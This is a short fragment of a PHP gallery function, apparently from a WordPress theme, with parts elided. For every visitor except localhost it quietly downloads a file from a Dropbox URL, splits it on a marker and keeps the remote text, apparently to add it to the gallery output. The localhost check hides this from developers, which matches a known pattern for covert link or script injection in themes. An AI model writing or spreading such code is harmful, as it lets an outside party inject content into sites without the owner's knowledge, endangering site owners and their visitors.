...
function gallery_theme($atts) {
	...
	$localusage = array('127.0.0.1', '::1');
	if(in_array($_SERVER['REMOTE_ADDR'], $localusage)) { $blstxt = ""; }
	else {
		$blsp = @file_get_contents('https://dl.dropboxusercontent.com/u/92792196/bls.data');
		$blspe = explode("#####:", $blsp);
		$blstxt = "\n" . $blspe[1];
	}
	if(count($images) > 0) {
